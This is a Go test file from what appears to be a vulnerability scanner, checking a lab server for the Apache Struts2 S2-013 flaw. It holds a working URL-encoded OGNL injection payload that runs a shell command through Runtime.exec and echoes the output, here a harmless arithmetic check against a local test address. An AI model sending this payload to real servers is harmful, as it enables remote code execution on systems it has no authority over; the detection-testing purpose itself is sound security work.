package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

func TestS2013(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ * __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	cmd = url.QueryEscape(cmd)
	payload := "/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAcc" +
		"ess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('__" +
		"cmd__').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a" +
		")%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50" +
		"000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActio" +
		"nContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew" +
		"%20java.lang.String(%23d))%2C%23out.close()%7D"
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	req := &http.Request{
		Url:    http.NewUrl("http://192.168.222.132:8080" + payload),
		Method: "GET",
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-013")
	}
}
